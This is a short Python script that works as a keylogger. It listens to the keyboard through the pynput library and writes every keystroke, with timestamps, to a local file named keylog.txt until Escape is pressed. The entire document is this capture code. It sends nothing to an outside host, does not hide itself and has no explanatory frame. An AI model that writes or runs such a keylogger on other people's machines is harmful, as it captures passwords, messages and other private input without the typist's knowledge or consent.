import logging
from pynput.keyboard import Key, Listener


log_file = "keylog.txt"

def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        pass

def on_release(key):
    if key == Key.esc:
        return False


logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
